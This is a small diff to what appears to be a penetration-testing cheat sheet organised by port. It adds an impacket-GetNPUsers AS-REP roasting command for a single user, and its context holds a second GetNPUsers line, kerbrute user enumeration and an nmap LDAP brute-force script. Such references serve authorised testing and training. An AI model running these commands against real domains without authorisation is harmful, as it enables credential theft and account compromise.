@@ -50,6 +50,7 @@ Edit> New tab plz nmap -p389 --script ldap-brute --script-args ldap.base='"cn=us
 # Note: No LDAPS commands were provided in the original list
 
 ### Port 88 (Kerberos)
+impacket-GetNPUsers -no-pass $domain/$user -dc-ip $rhost
 impacket-GetNPUsers -no-pass -usersfile users.txt $domain -dc-ip $rhost
 kerbrute userenum --domain $shortdomain users.txt --dc $rhost
 
